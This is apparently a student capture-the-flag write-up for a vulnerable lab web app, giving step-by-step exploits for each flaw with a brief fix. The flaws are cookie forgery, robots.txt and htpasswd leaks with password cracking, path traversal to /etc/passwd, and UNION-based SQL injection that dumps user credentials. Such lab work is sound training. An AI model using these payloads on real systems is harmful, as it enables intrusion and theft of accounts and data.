<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<!-- 2021-12-01 Wed 18:24 -->
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Write Up</title>
<meta name="author" content="John Doe" />
<meta name="generator" content="Org Mode" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: auto;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline; margin-top: 14px;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .equation-container {
    display: table;
    text-align: center;
    width: 100%;
  }
  .equation {
    vertical-align: middle;
  }
  .equation-label {
    display: table-cell;
    text-align: right;
    vertical-align: middle;
  }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { width: 90%; }
  /*]]>*/-->
</style>
<script type="text/javascript">
// @license magnet:?xt=urn:btih:e95b018ef3580986a04669f1b5879592219e2a7a&dn=public-domain.txt Public Domain
<!--/*--><![CDATA[/*><!--*/
     function CodeHighlightOn(elem, id)
     {
       var target = document.getElementById(id);
       if(null != target) {
         elem.classList.add("code-highlighted");
         target.classList.add("code-highlighted");
       }
     }
     function CodeHighlightOff(elem, id)
     {
       var target = document.getElementById(id);
       if(null != target) {
         elem.classList.remove("code-highlighted");
         target.classList.remove("code-highlighted");
       }
     }
    /*]]>*///-->
// @license-end
</script>
</head>
<body>
<div id="content">
<h1 class="title">Write Up</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#org965f6c9">1. Prerequesite</a></li>
<li><a href="#org2d0a8db">2. hidden<sub>attribute</sub></a>
<ul>
<li><a href="#org89105af">2.1. Vulnerability</a></li>
<li><a href="#orge201b36">2.2. Protection</a></li>
</ul>
</li>
<li><a href="#orgbbc261b">3. csrf<sub>cookie</sub></a>
<ul>
<li><a href="#orga8bffc0">3.1. Vulnerability</a></li>
<li><a href="#orga93818f">3.2. Protection</a></li>
</ul>
</li>
<li><a href="#orgbe78630">4. informations<sub>leaks</sub></a>
<ul>
<li><a href="#org9304578">4.1. Vulnerability</a></li>
<li><a href="#org8b1c17f">4.2. Protection</a></li>
</ul>
</li>
<li><a href="#org8295a8f">5. insecure<sub>path</sub></a>
<ul>
<li><a href="#orgc4c1c7f">5.1. Vulnerability</a></li>
<li><a href="#orgf16ab7b">5.2. Protection</a></li>
</ul>
</li>
<li><a href="#org0b23b9b">6. redirection</a>
<ul>
<li><a href="#orga71c64d">6.1. Vulnerability</a></li>
<li><a href="#orgc70884c">6.2. Protection</a></li>
</ul>
</li>
<li><a href="#org4660d24">7. idor</a>
<ul>
<li><a href="#org4874ba4">7.1. Vulnerability</a></li>
<li><a href="#org649d0d1">7.2. Protection</a></li>
</ul>
</li>
<li><a href="#orgf92248b">8. sql<sub>injection</sub></a>
<ul>
<li><a href="#org6c4860a">8.1. Vulnerability</a></li>
<li><a href="#org15d372a">8.2. Protection</a></li>
</ul>
</li>
</ul>
</div>
</div>

<div id="outline-container-org965f6c9" class="outline-2">
<h2 id="org965f6c9"><span class="section-number-2">1</span> Prerequesite</h2>
<div class="outline-text-2" id="text-1">
<p>
Lauch the VM and access to the IP indicated.
</p>
</div>
</div>

<div id="outline-container-org2d0a8db" class="outline-2">
<h2 id="org2d0a8db"><span class="section-number-2">2</span> hidden<sub>attribute</sub></h2>
<div class="outline-text-2" id="text-2">
</div>
<div id="outline-container-org89105af" class="outline-3">
<h3 id="org89105af"><span class="section-number-3">2.1</span> Vulnerability</h3>
<div class="outline-text-3" id="text-2-1">
<p>
On the page <a href="http://192.168.56.105/index.php?page=signin">http://192.168.56.105/index.php?page=signin</a> there is link to recover password and on this page there is an hidden form.
</p>
<ol class="org-ol">
<li>insepect the page</li>
<li>fill the form</li>
<li>click on the submit button</li>
</ol>
</div>
</div>
<div id="outline-container-orge201b36" class="outline-3">
<h3 id="orge201b36"><span class="section-number-3">2.2</span> Protection</h3>
<div class="outline-text-3" id="text-2-2">
<p>
Don&rsquo;t use hidden tag in html for sensitive information !
</p>
</div>
</div>
</div>

<div id="outline-container-orgbbc261b" class="outline-2">
<h2 id="orgbbc261b"><span class="section-number-2">3</span> csrf<sub>cookie</sub></h2>
<div class="outline-text-2" id="text-3">
</div>
<div id="outline-container-orga8bffc0" class="outline-3">
<h3 id="orga8bffc0"><span class="section-number-3">3.1</span> Vulnerability</h3>
<div class="outline-text-3" id="text-3-1">
<p>
The website gives us a cookie in order to check if we are admin or not. This cookie is a simple md5 hash which means &rsquo;false&rsquo;. We can replace it by the corresping hash for &rsquo;true&rsquo;.
</p>
<ol class="org-ol">
<li><code>hashid 68934a3e9455fa72420237eb05902327</code></li>
<li><code>echo -n "true" | md5</code></li>
<li>replace cookie with the result of the echo command.</li>
<li>reload the page</li>
</ol>
</div>
</div>
<div id="outline-container-orga93818f" class="outline-3">
<h3 id="orga93818f"><span class="section-number-3">3.2</span> Protection</h3>
<div class="outline-text-3" id="text-3-2">
<p>
A boolean is not enough, there must be a complex system of identification by user in the backend. (and don&rsquo;t use explicit sentences as &rsquo;I<sub>am</sub><sub>admin</sub>&rsquo;).
</p>
</div>
</div>
</div>
<div id="outline-container-orgbe78630" class="outline-2">
<h2 id="orgbe78630"><span class="section-number-2">4</span> informations<sub>leaks</sub></h2>
<div class="outline-text-2" id="text-4">
</div>
<div id="outline-container-org9304578" class="outline-3">
<h3 id="org9304578"><span class="section-number-3">4.1</span> Vulnerability</h3>
<div class="outline-text-3" id="text-4-1">
<p>
By doing some fuzzing on the website, we can found the file <b>robots.txt</b> which reveals informations of the content of the site.
On the page <a href="http://192.168.56.105/whatever/">http://192.168.56.105/whatever/</a> there is a <b>htpasswd</b> file.
</p>
<ol class="org-ol">
<li><code>ffuf -w ./informations_leaks/ressources/common.txt:FUZZ -u "http://192.168.56.105/FUZZ"</code></li>
<li>go to <a href="http://192.168.56.105/robots.txt">http://192.168.56.105/robots.txt</a></li>
<li>go to <a href="http://192.168.56.105/whatever/">http://192.168.56.105/whatever/</a></li>
<li><code>wget http://192.168.56.105/whatever/htpasswd</code></li>
<li>use <a href="https://crackstation.net/">https://crackstation.net/</a> to decode the hash</li>
<li>go to <a href="http://192.168.56.105/admin/">http://192.168.56.105/admin/</a></li>
<li>log-in with root:dragon</li>
</ol>
</div>
</div>
<div id="outline-container-org8b1c17f" class="outline-3">
<h3 id="org8b1c17f"><span class="section-number-3">4.2</span> Protection</h3>
<div class="outline-text-3" id="text-4-2">
<p>
Don&rsquo;t store sensitive informations in the <b>robots.txt</b> file, assume that attackers will pay close attention to any locations identified in the file.
</p>
</div>
</div>
</div>
<div id="outline-container-org8295a8f" class="outline-2">
<h2 id="org8295a8f"><span class="section-number-2">5</span> insecure<sub>path</sub></h2>
<div class="outline-text-2" id="text-5">
</div>
<div id="outline-container-orgc4c1c7f" class="outline-3">
<h3 id="orgc4c1c7f"><span class="section-number-3">5.1</span> Vulnerability</h3>
<div class="outline-text-3" id="text-5-1">
<p>
On the page <a href="http://192.168.56.105/.hidden/">http://192.168.56.105/.hidden/</a> found by the <b>robots.txt</b> there is some kind of labyrinth to protect the flag. But it stills vulnerable to crawling.
</p>
<ol class="org-ol">
<li>cd ./insecure<sub>path</sub>/ressources</li>
<li><code>bash crawl.sh "http://192.168.56.105/.hidden/" url_1 url_2 url_3</code></li>
<li><code>grep -v "gauche\|droite\|dessus\|dessous\|aussi\|bon\|non" result.txt</code></li>
</ol>
</div>
</div>
<div id="outline-container-orgf16ab7b" class="outline-3">
<h3 id="orgf16ab7b"><span class="section-number-3">5.2</span> Protection</h3>
<div class="outline-text-3" id="text-5-2">
<p>
Don&rsquo;t hide important informations like that. Use authentication or <b>htaccess</b> file to protect the folder.
</p>
</div>
</div>
</div>
<div id="outline-container-org0b23b9b" class="outline-2">
<h2 id="org0b23b9b"><span class="section-number-2">6</span> redirection</h2>
<div class="outline-text-2" id="text-6">
</div>
<div id="outline-container-orga71c64d" class="outline-3">
<h3 id="orga71c64d"><span class="section-number-3">6.1</span> Vulnerability</h3>
<div class="outline-text-3" id="text-6-1">
<p>
In the footer of the main page, the website has redirection of social media. We can change these redirection with anything we want and potentially to malicious pages.
</p>
<ol class="org-ol">
<li>change &ldquo;site=facebook&rdquo; by &ldquo;site=google&rdquo;</li>
<li>click on the link</li>
</ol>
</div>
</div>
<div id="outline-container-orgc70884c" class="outline-3">
<h3 id="orgc70884c"><span class="section-number-3">6.2</span> Protection</h3>
<div class="outline-text-3" id="text-6-2">
<p>
It&rsquo;s possible to check the redirection with some arrays, so it would not be possible to redirect on anything other that we predefined.
</p>
</div>
</div>
</div>
<div id="outline-container-org4660d24" class="outline-2">
<h2 id="org4660d24"><span class="section-number-2">7</span> idor</h2>
<div class="outline-text-2" id="text-7">
</div>
<div id="outline-container-org4874ba4" class="outline-3">
<h3 id="org4874ba4"><span class="section-number-3">7.1</span> Vulnerability</h3>
<div class="outline-text-3" id="text-7-1">
<p>
Indirect object references is a vulnerability that arises when an application uses user-supplied input to access objects directly. In whatever page on the site there is an attribute <b>page</b> in the url, we can change this attribute to access to anything on the server.
</p>
<ol class="org-ol">
<li>change <a href="http://192.168.56.105/index.php?page=sigin">http://192.168.56.105/index.php?page=sigin</a> by</li>
</ol>
<p>
<a href="http://192.168.56.105/index.php?page=../../../../../../../etc/passwd">http://192.168.56.105/index.php?page=../../../../../../../etc/passwd</a>
</p>
</div>
</div>
<div id="outline-container-org649d0d1" class="outline-3">
<h3 id="org649d0d1"><span class="section-number-3">7.2</span> Protection</h3>
<div class="outline-text-3" id="text-7-2">
<p>
Use an array of valid url, the attacker will have access only to these arrays.
</p>
</div>
</div>
</div>
<div id="outline-container-orgf92248b" class="outline-2">
<h2 id="orgf92248b"><span class="section-number-2">8</span> sql<sub>injection</sub></h2>
<div class="outline-text-2" id="text-8">
</div>
<div id="outline-container-org6c4860a" class="outline-3">
<h3 id="org6c4860a"><span class="section-number-3">8.1</span> Vulnerability</h3>
<div class="outline-text-3" id="text-8-1">
<p>
On the page <a href="http://192.168.56.105/index.php?page=member">http://192.168.56.105/index.php?page=member</a> we can search users by their &rsquo;id&rsquo;. If we enter a letter for example, an error is displayed which reveals that it reads sql commands.
</p>

<ol class="org-ol">
<li>1 OR 1</li>
<li>5 UNION SELECT database(),2</li>
<li>5 UNION SELECT table<sub>schema,table</sub><sub>name</sub> FROM information<sub>schema.columns</sub></li>
<li>5 UNION SELECT table<sub>name,column</sub><sub>name</sub> FROM information<sub>schema.columns</sub></li>
<li>5 UNION SELECT user<sub>id,planet</sub> FROM users</li>
<li>5 UNION SELECT user<sub>id,countersign</sub> FROM users</li>
<li>5 UNION SELECT user<sub>id,commentaire</sub> FROM users</li>
<li><code>echo -n 'fortytwo' | sha2</code></li>
</ol>
</div>
</div>
<div id="outline-container-org15d372a" class="outline-3">
<h3 id="org15d372a"><span class="section-number-3">8.2</span> Protection</h3>
<div class="outline-text-3" id="text-8-2">
<p>
Sanitize the input of form and use parametrized queries.
Parameterized queries are a means of pre-compiling an SQL statement so that you can then supply the parameters in order for the statement to be executed. This method makes it possible for the database to recognize the code and distinguish it from input data.
</p>
</div>
</div>
</div>
</div>
<div id="postamble" class="status">
<p class="author">Author: John Doe</p>
<p class="date">Created: 2021-12-01 Wed 18:24</p>
</div>
</body>
</html>
